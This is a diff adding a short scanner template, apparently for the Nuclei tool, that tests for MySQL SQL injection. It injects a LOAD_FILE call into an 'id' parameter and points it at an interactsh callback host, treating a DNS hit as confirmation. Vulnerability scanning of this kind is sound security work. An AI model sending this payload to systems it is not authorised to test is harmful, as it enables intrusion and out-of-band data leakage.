@@ -1,0 +1,19 @@
+id: ai-sqli-oob-loadfile
+
+info:
+  name: MySQL SQLi OOB via load_file()
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,dns,mysql
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- "
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
